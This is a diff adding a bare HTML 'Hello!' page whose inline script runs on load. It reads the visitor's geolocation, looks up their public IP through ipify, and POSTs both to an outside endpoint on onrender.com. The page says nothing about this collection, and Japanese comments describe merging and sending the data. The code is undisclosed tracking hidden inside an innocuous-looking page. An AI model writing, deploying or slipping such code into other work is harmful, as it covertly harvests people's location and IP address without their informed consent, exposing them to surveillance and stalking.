@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background: #fff;
+        }
+
+        h1 {
+            text-align: center;
+        }
+    </style>
+    <title>hello</title>
+</head>
+<body>
+    
+    <h1>Hello!</h1>
+
+    <script>
+
+function sendLocationToServer() {
+
+// IPアドレスを取得
+function getIPAddress() {
+  return fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => data.ip); 
+}
+
+// 位置情報は最初のコードを再利用
+navigator.geolocation.getCurrentPosition(function(position) {
+
+  var latitude = position.coords.latitude;
+  var longitude = position.coords.longitude;
+  
+  var locationData = {
+    latitude,
+    longitude 
+  };
+
+  // IPアドレスとマージして送信
+  getIPAddress().then(ip => {
+  
+    locationData.ip = ip;
+
+    fetch('https://location-ip-data-endpoint.onrender.com', {
+      method: 'POST',
+      headers: {
+       'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(locationData)  
+    });
+
+  });
+
+});
+
+}
+
+sendLocationToServer();
+
+
+    </script>
+</body>
+</html>
